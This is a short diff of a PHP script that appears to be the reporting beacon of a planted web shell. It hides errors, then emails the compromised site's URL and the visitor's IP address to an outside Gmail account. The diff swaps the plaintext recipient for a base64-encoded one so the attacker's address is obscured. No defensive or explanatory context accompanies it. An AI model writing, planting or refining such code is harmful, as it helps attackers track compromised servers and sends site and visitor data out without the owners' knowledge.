@@ -7,8 +7,8 @@
 @ini_set('display_errors', 0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$to = 'exploitkite@gmail.com';
+$e=base64_decode('YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==');
 $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+mail($e, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
